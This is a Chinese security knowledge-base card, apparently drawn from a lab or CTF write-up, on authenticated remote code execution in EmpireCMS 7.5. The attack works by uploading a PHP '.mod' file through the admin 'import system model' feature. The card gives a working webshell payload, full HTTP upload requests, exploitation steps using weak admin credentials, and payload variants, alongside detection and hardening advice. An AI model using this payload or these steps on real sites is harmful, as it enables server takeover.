---
id: web-generic-file-upload-empirecms-model-import-mod-php-rce
title: 帝国CMS 7.5 后台导入系统模型上传 .mod 执行 PHP 写 Webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: cms-model-import-php-file-execution
tags:
- empirecms
- php
- cms
- file-upload
- authenticated
- rce
- webshell
- model-import
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V83
  verified_at: '2026-11-05T17:46:44+08:00'
  notes: 已对照原文与图03-09核对：图04 为 EmpireCMS 7.5 后台登录页，图05 管理数据表含“导入系统模型”，图06 1.php.mod 内容、图07 表名 phome_ecms_qwe、图08 蚁剑连接 /e/admin/getshell.php 密码 cmd 成功、图09 whoami=zabbix 并读到 flag 均一致。修正：原文只写后台账号 admin/admin123，未称其为默认口令，卡内“默认口令”已改为“弱口令”表述；原文未贴导入功能源码，include/require 执行机制为按帝国CMS模型文件格式的合理推断，卡内已注明；EmpireCMS 7.5 仅为靶场目标环境版本，原文未声明受影响区间，已 clear affected_versions。PoC 未复跑。
url: /docs/web/generic/file-upload/web-generic-file-upload-empirecms-model-import-mod-php-rce/
draft: false
kb_aliases:
- 帝国CMS 导入系统模型 getshell
- EmpireCMS model import RCE
- .mod 文件 getshell
- 1.php.mod
- 帝国CMS 后台写 webshell
- file_put_contents getshell.php
---

## 一句话结论

帝国CMS 7.5 后台的“导入系统模型”功能把上传的 `.mod` 文件当作 PHP 模型定义包含执行；管理员登录后（本文后台口令为弱口令 `admin/admin123`，原文未说明是否为默认口令）上传内容为 `file_put_contents(...)` 的 `1.php.mod`，即可在 `/e/admin/` 下写出 `getshell.php`，蚁剑连接后获得 PHP 命令执行。

## 原理

- 帝国CMS 的“系统模型”文件本质是 PHP 代码：导入功能需要执行模型定义来创建/更新数据表与字段，因此对上传的 `.mod` 文件做 `include`/`require` 处理，而不是当作纯文本或序列化数据解析。
- PHP 的 `include` 只按文件内容识别 `<?php ... ?>`，与扩展名无关；`.mod` 后缀不会阻止代码执行。这是对“导入并执行 PHP 模型”这一合法功能的滥用，不需要额外的上传解析漏洞。
- 导入脚本运行时的工作目录是后台目录 `/e/admin`（本文写入的 `getshell.php` 最终可通过 `http://<host>:8001/e/admin/getshell.php` 访问，蚁剑成功连接），所以 payload 里使用相对路径 `file_put_contents("getshell.php", ...)` 就会落在该目录。
- 上传的 `.mod` 内容是 `<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>`：第一层 PHP 代码在导入时执行，第二层字符串被写入磁盘形成一句话木马；`\$` 转义保证写入文件的是 `$_POST[cmd]` 而不是被当前请求求值。
- 入口门槛是管理员权限；本文后台使用弱口令 `admin/admin123`，且后台路径为常见的 `/e/admin`，因此从暴露面到 RCE 只需要一次后台登录。

## 触发条件

- 目标为 EmpireCMS 7.5（原文后台页标识；其他支持模型导入的版本可能同样适用，需按版本验证）。
- 能访问 `/e/admin/` 后台，且拥有管理员会话；后台口令为弱口令（如本文 `admin/admin123`）时可直接登录。
- “导入系统模型”功能未被禁用，服务器允许 `include` 上传的临时文件。
- PHP 进程对后台目录（或 payload 指定的写入目录）有写权限，且写入的 `.php` 可被 Web 访问。

## 利用步骤

1. 通过端口扫描发现 8001 端口的帝国CMS，访问 `http://<host>:8001/e/admin/`。
2. 用管理员口令登录（本文 `admin/admin123`）。
3. 进入“系统 → 数据表与系统模型 → 管理数据表”，点击“导入系统模型”。
4. 准备 `1.php.mod`，内容为写一句话木马的 PHP 代码（见 PoC）。
5. 在“存放的数据表名”填任意名称（本文填 `phome_ecms_qwe`），选择 `1.php.mod`，点击“马上导入”。
6. 导入时 PHP 代码执行，`getshell.php` 写入 `/e/admin/`；访问该 URL 并用蚁剑连接，连接密码 `cmd`。
7. 在 webshell 中执行 `id`/`whoami` 验证权限；本文进程用户为 `zabbix`，随后读取 `/flag.txt`。

## PoC

`1.php.mod`：

```php
<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
```

导入请求（字段名以实际表单为准）：

```http
POST /e/admin/<模型导入接口> HTTP/1.1
Host: target:8001
Cookie: <admin-session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="tablename"

phome_ecms_qwe
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.php.mod"
Content-Type: application/octet-stream

<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
------WebKitFormBoundary--
```

```http
POST /e/admin/getshell.php HTTP/1.1
Host: target:8001
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```

说明：原文通过后台界面完成上传，蚁剑配置的 URL 为 `http://172.20.5.5:8001/e/admin/getshell.php`、密码 `cmd`，连接成功后执行命令并读到 flag；原文未贴导入功能的源码，`include` 机制按帝国CMS模型文件的 PHP 代码格式解释。

## 变体与关联

- **payload 变体**：可直接写 `<?php system($_POST['cmd']); ?>`、`assert`、加密一句话或内存马；也可先 `file_put_contents` 到其他可写目录，再用文件包含/上传目录访问。
- **写入路径变体**：相对路径依赖导入脚本的当前工作目录；若后台目录不可写，可改为绝对路径或先探测可写目录。
- **同类 CMS 后台导入**：模板/模型/插件导入功能只要会执行上传文件中的 PHP，就可用同样思路；参见 [[web-generic-file-upload-emlog-template-zip-header-php-rce]]、[[web-generic-file-upload-fastcms-template-upload-filename-traversal]]、[[web-generic-file-upload-feehicms-ad-upload-saveas-rce]]、[[web-generic-file-upload-jeewms-cgformtemplate-zipslip-templatecode]]。
- **关联**：[[web-generic-file-upload-thinkphp-admin-upload-unzip-webshell]]（后台导入压缩包写 webshell）、[[web-php-rce-wegia-backup-filename-command-injection]]（另一套 CMS 的后台功能滥用）。
- **边界**：后台口令已改且无有效会话、模型导入功能被禁用、上传目录 noexec/不可写或 `.php` 被 Web 服务器拒绝执行时，本路径失效。

## 检测与防御

- **检测**：后台“导入系统模型”接口出现 `.mod` 上传，随后 `/e/admin/` 下新增 `.php` 文件；Web 日志中出现上传后立即访问新 PHP 文件的连续请求。
- **检测**：管理员账号从异常来源登录、使用默认口令 `admin/admin123`；`file_put_contents`/`eval` 相关 PHP 告警与 webshell 流量特征（蚁剑 UA、`cmd=` 参数）。
- **防御**：修改默认管理员口令并启用强口令/双因素；限制 `/e/admin/` 的访问来源（IP 白名单、VPN）。
- **加固**：禁用或收紧“导入系统模型”等高危后台功能，仅超级管理员可用；对上传的 `.mod` 做内容白名单校验，禁止 `<?php` 等代码；后台目录与上传目录分离并设置不可执行。
- **响应**：删除异常 `.php` 文件、轮换管理员口令、审计 Web 进程子进程与出站连接、排查同一主机上的横向行为。
